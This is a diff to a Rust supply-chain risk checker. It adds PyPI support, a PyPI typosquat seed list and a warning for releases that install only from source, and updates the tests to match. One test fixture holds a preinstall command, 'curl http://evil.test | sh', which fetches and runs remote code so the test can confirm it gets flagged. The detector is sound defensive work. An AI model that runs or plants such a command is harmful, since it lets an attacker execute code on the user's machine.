@@ -14,13 +14,14 @@ pub const RECENT_VERSION_DAYS: i64 = 7;
 
 pub fn report(
     meta: PackageMeta,
+    ecosystem: Ecosystem,
     weekly_downloads: Option<u64>,
     advisories: Option<&AdvisoryList>,
     local: &[String],
     profile: Profile,
     now: i64,
 ) -> PackageReport {
-    let mut findings = assess(&meta, local, &profile, now);
+    let mut findings = assess(&meta, ecosystem, local, &profile, now);
     match advisories {
         Some(list) => {
             findings.extend(advisory_findings(&list.advisories));
@@ -33,7 +34,7 @@ pub fn report(
     findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));
 
     PackageReport {
-        ecosystem: Ecosystem::Npm,
+        ecosystem,
         name: meta.name,
         version: meta.version,
         first_published_at: meta.first_published_at,
@@ -74,6 +75,20 @@ const AUTOMATION_PUBLISHERS: &[&str] = &[
 pub fn is_automation_publisher(publisher: &str) -> bool {
     let normalized = publisher.trim().to_ascii_lowercase();
     normalized.ends_with("[bot]") || AUTOMATION_PUBLISHERS.contains(&normalized.as_str())
+}
+
+fn package_page(ecosystem: Ecosystem, name: &str, version: &str) -> String {
+    match ecosystem {
+        Ecosystem::Npm => package_page_url(name, version),
+        Ecosystem::Pypi => format!("https://pypi.org/project/{name}/{version}/"),
+    }
+}
+
+fn project_page(ecosystem: Ecosystem, name: &str) -> String {
+    match ecosystem {
+        Ecosystem::Npm => format!("https://www.npmjs.com/package/{name}"),
+        Ecosystem::Pypi => format!("https://pypi.org/project/{name}/"),
+    }
 }
 
 /// One finding per advisory, each linking to its OSV record.
@@ -143,11 +158,21 @@ pub fn advisory_check_unavailable() -> Finding {
     }
 }
 
-pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64) -> Vec<Finding> {
+pub fn assess(
+    meta: &PackageMeta,
+    ecosystem: Ecosystem,
+    local: &[String],
+    profile: &Profile,
+    now: i64,
+) -> Vec<Finding> {
     let mut findings = Vec::new();
 
+    let seed = match ecosystem {
+        Ecosystem::Npm => typosquat::POPULAR,
+        Ecosystem::Pypi => typosquat::POPULAR_PYPI,
+    };
     let suspect = if profile.typosquat {
-        typosquat::closest(&meta.name, typosquat::POPULAR, local)
+        typosquat::closest(&meta.name, seed, local)
     } else {
         None
     };
@@ -180,7 +205,7 @@ pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64)
                     Evidence {
                         label: "this package".to_string(),
                         value: meta.name.clone(),
-                        url: Some(package_page_url(&meta.name, &meta.version)),
+                        url: Some(package_page(ecosystem, &meta.name, &meta.version)),
                     },
                     Evidence {
                         label: if suspect.local {
@@ -189,10 +214,7 @@ pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64)
                             "popular package".to_string()
                         },
                         value: suspect.candidate.to_string(),
-                        url: Some(format!(
-                            "https://www.npmjs.com/package/{}",
-                            suspect.candidate
-                        )),
+                        url: Some(project_page(ecosystem, suspect.candidate)),
                     },
                 ],
             });
@@ -279,7 +301,7 @@ pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64)
         });
     }
 
-    if !meta.install_scripts.is_empty() {
+    if ecosystem == Ecosystem::Npm && !meta.install_scripts.is_empty() {
         let compounded = fresh || publisher_mismatch || typosquat_high;
         let mut evidence: Vec<Evidence> = meta
             .install_scripts
@@ -313,6 +335,28 @@ pub fn assess(meta: &PackageMeta, local: &[String], profile: &Profile, now: i64)
                     .to_string()
             },
             evidence,
+        });
+    }
+
+    if ecosystem == Ecosystem::Pypi && meta.build_from_source && profile.execution {
+        findings.push(Finding {
+            id: "build-from-source",
+            severity: Severity::Warn,
+            title: "installs by building from source".to_string(),
+            detail: "no wheel is published for this version, so pip runs the project's build backend, which executes code with your permissions during install"
+                .to_string(),
+            evidence: vec![
+                Evidence {
+                    label: "files for this version".to_string(),
+                    value: "sdist only".to_string(),
+                    url: Some(meta.registry_url.clone()),
+                },
+                Evidence {
+                    label: "why this matters".to_string(),
+                    value: "PEP 517 build backends run arbitrary code".to_string(),
+                    url: Some("https://peps.python.org/pep-0517/".to_string()),
+                },
+            ],
         });
     }
 
@@ -367,6 +411,7 @@ mod tests {
             maintainers: vec!["alice".to_string()],
             publisher: Some("alice".to_string()),
             install_scripts: vec![],
+            build_from_source: false,
             repository: Some("https://github.com/alice/some-package".to_string()),
             deprecated: None,
             registry_url: "https://registry.npmjs.org/some-package".to_string(),
@@ -386,7 +431,7 @@ mod tests {
 
     #[test]
     fn an_old_plain_package_is_clean() {
-        let findings = assess(&meta(), &[], &Profile::NPM, NOW);
+        let findings = assess(&meta(), Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert!(findings.is_empty(), "unexpected findings: {findings:?}");
     }
 
@@ -397,7 +442,7 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["install-scripts"]);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
@@ -414,13 +459,13 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
         );
         assert_eq!(
-            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
             2,
             "install script + freshness should exit 2"
         );
@@ -434,7 +479,7 @@ mod tests {
             name: "preinstall".to_string(),
             command: "curl http://evil.test | sh".to_string(),
         });
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
@@ -449,7 +494,7 @@ mod tests {
             name: "install".to_string(),
             command: "node index.js".to_string(),
         });
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(
             finding(&findings, "install-scripts").severity,
             Severity::High
@@ -465,11 +510,50 @@ mod tests {
             typosquat: false,
             ..Profile::NPM
         };
-        let findings = assess(&meta, &[], &partial, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &partial, NOW);
         assert!(!findings.iter().any(|finding| finding.id == "typosquat"));
 
-        let report = report(meta, None, None, &[], partial, NOW);
+        let report = report(meta, Ecosystem::Npm, None, None, &[], partial, NOW);
         assert_eq!(report.not_checked, vec!["typosquat"]);
+    }
+
+    #[test]
+    fn an_sdist_only_pypi_release_is_a_build_warning() {
+        let mut meta = meta();
+        meta.build_from_source = true;
+        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
+        let finding = finding(&findings, "build-from-source");
+        assert_eq!(finding.severity, Severity::Warn);
+        assert!(finding.detail.contains("build backend"));
+        assert_eq!(
+            report(meta, Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW).exit_code(),
+            1
+        );
+    }
+
+    #[test]
+    fn pypi_reports_its_missing_signals() {
+        let report = report(meta(), Ecosystem::Pypi, None, None, &[], Profile::PYPI, NOW);
+        assert_eq!(report.not_checked, vec!["maintainers", "downloads"]);
+        assert_eq!(report.ecosystem, Ecosystem::Pypi);
+    }
+
+    #[test]
+    fn pypi_typosquat_uses_the_pypi_seed() {
+        let mut meta = meta();
+        meta.name = "request".to_string();
+        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
+        let finding = finding(&findings, "typosquat");
+        assert_eq!(finding.severity, Severity::High);
+        assert!(finding.detail.contains("requests"));
+    }
+
+    #[test]
+    fn npm_names_are_not_flagged_against_the_pypi_seed() {
+        let mut meta = meta();
+        meta.name = "expres".to_string();
+        let findings = assess(&meta, Ecosystem::Pypi, &[], &Profile::PYPI, NOW);
+        assert!(!findings.iter().any(|finding| finding.id == "typosquat"));
     }
 
     #[test]
@@ -477,7 +561,7 @@ mod tests {
         let mut meta = meta();
         meta.name = "crossenv".to_string();
         let local = vec!["cross-env".to_string()];
-        let findings = assess(&meta, &local, &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW);
         let finding = finding(&findings, "typosquat");
         assert_eq!(finding.severity, Severity::High);
         assert!(finding.detail.contains("already in your lockfile"));
@@ -489,7 +573,7 @@ mod tests {
         let mut meta = meta();
         meta.name = "preact".to_string();
         let local = vec!["react".to_string()];
-        assert!(assess(&meta, &local, &Profile::NPM, NOW).is_empty());
+        assert!(assess(&meta, Ecosystem::Npm, &local, &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -497,7 +581,7 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["fresh-package"]);
         assert_eq!(finding(&findings, "fresh-package").severity, Severity::Warn);
     }
@@ -507,14 +591,14 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW - FRESH_DAYS * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
+        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
     fn a_recent_version_on_an_old_package_is_only_info() {
         let mut meta = meta();
         meta.published_at = Some(NOW - 2 * date::SECONDS_PER_DAY);
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["fresh-version"]);
         assert_eq!(finding(&findings, "fresh-version").severity, Severity::Info);
     }
@@ -524,14 +608,14 @@ mod tests {
         let mut meta = meta();
         meta.first_published_at = Some(NOW + 400 * date::SECONDS_PER_DAY);
         meta.published_at = meta.first_published_at;
-        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
+        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
     fn publisher_not_in_maintainers_is_a_warning() {
         let mut meta = meta();
         meta.publisher = Some("mallory".to_string());
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["publisher-not-maintainer"]);
         assert!(
             finding(&findings, "publisher-not-maintainer")
@@ -544,7 +628,7 @@ mod tests {
     fn maintainer_matching_is_case_insensitive() {
         let mut meta = meta();
         meta.publisher = Some("Alice".to_string());
-        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
+        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -552,7 +636,7 @@ mod tests {
         let mut meta = meta();
         meta.maintainers.clear();
         meta.publisher = Some("mallory".to_string());
-        assert!(assess(&meta, &[], &Profile::NPM, NOW).is_empty());
+        assert!(assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty());
     }
 
     #[test]
@@ -573,7 +657,7 @@ mod tests {
             let mut meta = meta();
             meta.publisher = Some(publisher.to_string());
             assert!(
-                assess(&meta, &[], &Profile::NPM, NOW).is_empty(),
+                assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW).is_empty(),
                 "{publisher} should not be treated as a human publisher"
             );
         }
@@ -583,10 +667,10 @@ mod tests {
     fn one_edit_typosquat_is_high_risk() {
         let mut meta = meta();
         meta.name = "expres".to_string();
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "typosquat").severity, Severity::High);
         assert_eq!(
-            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
             2
         );
     }
@@ -595,10 +679,10 @@ mod tests {
     fn two_edit_typosquat_is_a_warning() {
         let mut meta = meta();
         meta.name = "expreszz".to_string();
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "typosquat").severity, Severity::Warn);
         assert_eq!(
-            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
             1
         );
     }
@@ -607,7 +691,7 @@ mod tests {
     fn homoglyph_typosquat_is_high_risk() {
         let mut meta = meta();
         meta.name = "1odash".to_string();
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         let typosquat = finding(&findings, "typosquat");
         assert_eq!(typosquat.severity, Severity::High);
         assert!(typosquat.detail.contains("lookalike"));
@@ -617,7 +701,7 @@ mod tests {
     fn deprecated_versions_are_a_warning() {
         let mut meta = meta();
         meta.deprecated = Some("use v2".to_string());
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(finding(&findings, "deprecated").severity, Severity::Warn);
     }
 
@@ -625,10 +709,10 @@ mod tests {
     fn missing_repository_is_only_info() {
         let mut meta = meta();
         meta.repository = None;
-        let findings = assess(&meta, &[], &Profile::NPM, NOW);
+        let findings = assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW);
         assert_eq!(ids(&findings), vec!["no-repository"]);
         assert_eq!(
-            report(meta, None, None, &[], Profile::NPM, NOW).exit_code(),
+            report(meta, Ecosystem::Npm, None, None, &[], Profile::NPM, NOW).exit_code(),
             0
         );
     }
@@ -644,7 +728,7 @@ mod tests {
             name: "postinstall".to_string(),
             command: "node setup.js".to_string(),
         });
-        for finding in assess(&meta, &[], &Profile::NPM, NOW) {
+        for finding in assess(&meta, Ecosystem::Npm, &[], &Profile::NPM, NOW) {
             assert!(
                 !finding.evidence.is_empty(),
                 "finding {} has no evidence",
@@ -665,7 +749,15 @@ mod tests {
     fn report_carries_registry_facts_through() {
         let mut meta = meta();
         meta.deprecated = Some("old".to_string());
-        let report = report(meta, Some(1234), None, &[], Profile::NPM, NOW);
+        let report = report(
+            meta,
+            Ecosystem::Npm,
+            Some(1234),
+            None,
+            &[],
+            Profile::NPM,
+            NOW,
+        );
         assert_eq!(report.ecosystem, Ecosystem::Npm);
         assert_eq!(report.weekly_downloads, Some(1234));
         assert_eq!(report.maintainers, vec!["alice"]);
@@ -706,7 +798,15 @@ mod tests {
     #[test]
     fn a_high_advisory_exits_two() {
         let advisories = list(vec![advisory("GHSA-bbbb", Severity::High)]);
-        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
+        let report = report(
+            meta(),
+            Ecosystem::Npm,
+            None,
+            Some(&advisories),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
         assert_eq!(report.exit_code(), 2);
         assert_eq!(report.advisories.len(), 1);
     }
@@ -717,7 +817,15 @@ mod tests {
             advisories: vec![advisory("GHSA-eeee", Severity::Warn)],
             hidden: 15,
         };
-        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
+        let report = report(
+            meta(),
+            Ecosystem::Npm,
+            None,
+            Some(&advisories),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
         let note = report
             .findings
             .iter()
@@ -731,13 +839,21 @@ mod tests {
     #[test]
     fn a_low_advisory_is_informational() {
         let advisories = list(vec![advisory("GHSA-cccc", Severity::Info)]);
-        let report = report(meta(), None, Some(&advisories), &[], Profile::NPM, NOW);
+        let report = report(
+            meta(),
+            Ecosystem::Npm,
+            None,
+            Some(&advisories),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
         assert_eq!(report.exit_code(), 0);
     }
 
     #[test]
     fn an_unreachable_osv_is_flagged_but_does_not_fail_the_run() {
-        let report = report(meta(), None, None, &[], Profile::NPM, NOW);
+        let report = report(meta(), Ecosystem::Npm, None, None, &[], Profile::NPM, NOW);
         assert_eq!(report.exit_code(), 0);
         assert_eq!(report.findings.len(), 1);
         assert_eq!(report.findings[0].id, "advisory-check-unavailable");
@@ -749,7 +865,15 @@ mod tests {
         let mut meta = meta();
         meta.repository = None; // INFO
         let advisories = list(vec![advisory("GHSA-dddd", Severity::High)]);
-        let report = report(meta, None, Some(&advisories), &[], Profile::NPM, NOW);
+        let report = report(
+            meta,
+            Ecosystem::Npm,
+            None,
+            Some(&advisories),
+            &[],
+            Profile::NPM,
+            NOW,
+        );
         assert_eq!(report.findings[0].severity, Severity::High);
         assert_eq!(report.findings[0].id, "advisory");
     }
